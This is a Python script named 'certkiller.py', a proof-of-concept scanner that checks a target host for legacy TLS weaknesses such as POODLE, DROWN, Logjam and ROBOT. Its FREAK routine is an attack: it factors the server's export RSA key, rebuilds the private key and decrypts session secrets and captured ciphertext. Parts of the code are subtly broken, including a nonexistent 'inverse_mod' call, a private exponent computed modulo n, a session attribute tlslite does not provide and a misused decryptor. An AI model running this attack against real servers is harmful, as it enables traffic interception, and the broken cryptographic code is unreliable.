#!/usr/bin/env python3

# requirements.txt
#tlslite-ng==0.8.2        # pure-Python TLS library
#cryptography==44.0.3     # cryptographic primitives
#pyecm==0.0.3             # Elliptic-curve factorization
#gmpy2==2.2.1             # GMP multiple-precision support


"""
certkiller.py: Minimalistic, extensible PoC scanner for legacy TLS weaknesses,
including a real Bleichenbacher (ROBOT) oracle check via robot-detect.

Tests implemented:
  - FREAK     : EXPORT-RSA downgrade & key factoring (pyecm)
  - BEAST     : TLS 1.0 CBC support
  - POODLE    : SSL 3.0 support
  - RC4       : RC4 support in TLS 1.2
  - Sweet32   : 3DES support in TLS 1.2
  - DROWN     : SSL 2.0 support
  - Logjam    : DHE_EXPORT support (export DH)
  - ROBOT     : Bleichenbacher RSA padding oracle test (via robot-detect)

Usage:
  python3 certkiller.py example.com
  python3 certkiller.py example.com --only freak,robot
  python3 certkiller.py example.com -t "BASE64_IV||CIPHERTEXT"
"""

import argparse
import base64
import socket
import subprocess
import sys
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import pyecm
from tlslite.api import TLSConnection, HandshakeSettings
from tlslite.errors import TLSRemoteAlert, AlertDescription
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes, hmac
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHash
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# ───── Configuration ─────

TIMEOUT         = 10   # seconds per openssl test
OPENSSL_BIN     = "openssl"
MAX_WORKERS     = 6
SUPPORTED_TESTS = [
    "freak", "beast", "poodle", "rc4",
    "sweet32", "drown", "logjam", "robot"
]

# ───── Utility Functions ─────

def prf_tls10(secret: bytes, label: bytes, seed: bytes, size: int) -> bytes:
    """TLS 1.0 PRF per RFC2246: P_MD5 XOR P_SHA1."""
    def p_hash(hash_cls, secret_part, data, out_len):
        result = b""
        A = data
        while len(result) < out_len:
            A = hmac.HMAC(secret_part, A, hash_cls(), backend=default_backend()).finalize()
            result += hmac.HMAC(secret_part, A + data, hash_cls(), backend=default_backend()).finalize()
        return result[:out_len]

    half = len(secret) // 2
    S1, S2 = secret[:half], secret[half:]
    md5_bytes  = p_hash(hashes.MD5,  S1, label + seed, size)
    sha1_bytes = p_hash(hashes.SHA1, S2, label + seed, size)
    return bytes(a ^ b for a, b in zip(md5_bytes, sha1_bytes))

def derive_tls10_master(pre_master, client_rand, server_rand):
    return prf_tls10(pre_master, b"master secret", client_rand + server_rand, 48)

def decrypt_blob(master_secret, blob_b64):
    """AES-128-CBC decrypt of base64 IV||ciphertext."""
    raw = base64.b64decode(blob_b64)
    iv, ct = raw[:16], raw[16:]
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    key = master_secret[:16]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    return cipher.decryptor().update(ct) + cipher.decryptor().finalize()

def factor_modulus(n_int):
    """Factor a 512-bit RSA modulus using pyecm."""
    factors = []
    pyecm.factors(n_int, factors, timeout=60, threads=4)
    if len(factors) < 2:
        raise RuntimeError("pyecm failed to factor modulus")
    return tuple(sorted(factors[:2]))

def build_private_key(p, q):
    """Reconstruct RSA private key via CRT."""
    pub_nums = rsa.RSAPublicNumbers(e=65537, n=p * q)
    priv_nums = rsa.RSAPrivateNumbers(
        p=p, q=q,
        d=pub_nums.inverse_mod(65537, p * q),
        dmp1=rsa.rsa_crt_dmp1(p, q),
        dmq1=rsa.rsa_crt_dmq1(p, q),
        iqmp=rsa.rsa_crt_iqmp(p, q),
        public_numbers=pub_nums
    )
    return priv_nums.private_key(default_backend())

def print_report(label, host, port, cmd, output):
    """Print a mini technical report for a vulnerable test."""
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    proto, cipher = None, None
    for line in output.splitlines():
        if line.strip().startswith("Protocol"):
            proto = line.split(":", 1)[1].strip()
        if line.strip().startswith("Cipher"):
            cipher = line.split(":", 1)[1].strip()

    print(f"\n=== [{label}] VULNERABILITY REPORT ===")
    print(f"Timestamp           : {now}")
    print(f"Target              : {host}:{port}")
    print(f"Test                : {label}")
    print(f"Command             : {' '.join(cmd)}")
    if proto:
        print(f"Negotiated Protocol : {proto}")
    if cipher:
        print(f"Negotiated Cipher   : {cipher}")
    print("Output Snippet:")
    for ln in output.splitlines()[:10]:
        print("   " + ln)
    print("=== End of Report ===\n")

def test_openssl(host, port, proto, cipher, label):
    """Attempt an openssl handshake; on vuln, print report."""
    cmd = [OPENSSL_BIN, "s_client", "-connect", f"{host}:{port}", proto, "-cipher", cipher]
    try:
        proc = subprocess.run(cmd, input="Q\n", text=True,
                              capture_output=True, timeout=TIMEOUT)
    except Exception as e:
        print(f"[?] {label}: test error ({e})")
        return None

    out = proc.stdout + proc.stderr
    if proc.returncode == 0 and "Cipher is (NONE)" not in out:
        print_report(label, host, port, cmd, out)
        return True
    else:
        print(f"[*] {label}: not supported")
        return False

# ───── Test Implementations ─────

def run_freak(host, port, token):
    """EXPORT-RSA → factor → derive master-secret → optional decrypt."""
    try:
        sock = socket.create_connection((host, port))
        settings = HandshakeSettings()
        settings.minVersion = (3,1); settings.maxVersion = (3,1)
        settings.cipherNames = ['rc4']; settings.macNames = ['md5']
        settings.minKeySize = settings.maxKeySize = 512

        conn = TLSConnection(sock)
        try:
            conn.handshakeClientCert(settings=settings)
        except TLSRemoteAlert as e:
            if e.description == AlertDescription.handshake_failure:
                print("[*] FREAK: EXPORT-RSA not supported")
                return
            raise

        print_report("FREAK (EXPORT-RSA)", host, port,
                     ["tlslite-ng handshake export-rsa"], "")
        cert   = conn.session.serverCertChain[0]
        c_rand = conn.session.clientRandom
        s_rand = conn.session.serverRandom
        cke    = conn.session.clientKeyExchangeMessage
        sock.close()

        n = serialization.load_pem_public_key(
            cert.publicBytes(), backend=default_backend()
        ).public_numbers().n

        print("[*] FREAK: factoring 512-bit modulus…")
        p, q = factor_modulus(n)
        print(f"[!] FREAK: factors found p={p}, q={q}")

        priv = build_private_key(p, q)
        pre_master = priv.decrypt(cke, padding.PKCS1v15())
        master     = derive_tls10_master(pre_master, c_rand, s_rand)
        print("[+] FREAK: master secret derived")

        if token:
            clear = decrypt_blob(master, token)
            print("[+] FREAK: decrypted blob →", clear)

    except Exception as e:
        print(f"[?] FREAK: error ({e})")

def run_logjam(host, port, _):
    test_openssl(host, port, "-tls1", "EXP-EDH-RSA-DES-CBC-SHA", "Logjam (DHE_EXPORT)")

def run_robot(host, port, _):
    """
    Run a true Bleichenbacher oracle test via the 'robot-detect' tool.
    Requires 'robot-detect' in your PATH.
    """
    cmd = ["robot-detect", host, str(port)]
    print(f"[*] ROBOT: invoking {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except Exception as e:
        print(f"[?] ROBOT: test error ({e})")
        return

    out = proc.stdout + proc.stderr
    if "NOT VULNERABLE" in out:
        print("[*] ROBOT: no padding oracle detected → not vulnerable")
    else:
        print_report("ROBOT (Bleichenbacher oracle)", host, port, cmd, out)

# ───── Main ─────

def main():
    parser = argparse.ArgumentParser(
        description="certkiller.py: scan for legacy TLS weaknesses"
    )
    parser.add_argument("domain", help="Target host or IP")
    parser.add_argument("-p","--port", type=int, default=443)
    parser.add_argument("-t","--token",
        help="Base64 IV||ciphertext to decrypt (FREAK only)")
    parser.add_argument("--only",
        help="Comma-separated list of tests: " + ",".join(SUPPORTED_TESTS))
    args = parser.parse_args()

    host, port, token = args.domain, args.port, args.token
    run_list = args.only.split(",") if args.only else SUPPORTED_TESTS

    tests = []
    if "freak"   in run_list: tests.append(("freak",   run_freak, (host,port,token)))
    if "beast"   in run_list: tests.append(("beast",   test_openssl, (host,port,"-tls1","AES128-SHA","BEAST (TLS1.0 CBC)")))
    if "poodle"  in run_list: tests.append(("poodle",  test_openssl, (host,port,"-ssl3","ALL","POODLE (SSL 3.0)")))
    if "rc4"     in run_list: tests.append(("rc4",     test_openssl, (host,port,"-tls1_2","RC4-SHA","RC4 (TLS 1.2)")))
    if "sweet32" in run_list: tests.append(("sweet32", test_openssl, (host,port,"-tls1_2","DES-CBC3-SHA","Sweet32 (3DES TLS 1.2)")))
    if "drown"   in run_list: tests.append(("drown",   test_openssl, (host,port,"-ssl2","ALL","DROWN (SSL 2.0)")))
    if "logjam"  in run_list: tests.append(("logjam",  run_logjam,   (host,port,None)))
    if "robot"   in run_list: tests.append(("robot",   run_robot,    (host,port,None)))

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for future in as_completed({
            executor.submit(func, *params): name
            for name, func, params in tests
        }):
            pass  # each test prints its own output

if __name__ == "__main__":
    main()
